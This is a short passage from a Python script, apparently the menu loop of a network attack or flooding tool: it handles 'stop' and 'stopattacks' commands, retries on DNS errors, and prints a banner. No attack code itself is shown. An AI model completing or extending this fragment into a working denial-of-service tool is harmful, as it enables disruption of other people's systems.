				main()
			except socket.gaierror:
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			attack = False
			while not attack:
				if aid == 0:
					attack = True

		else:
			main()


try:
	clear = "clear"
	os.system(clear)
	print(banner)
	main()
except KeyboardInterrupt:
	exit()
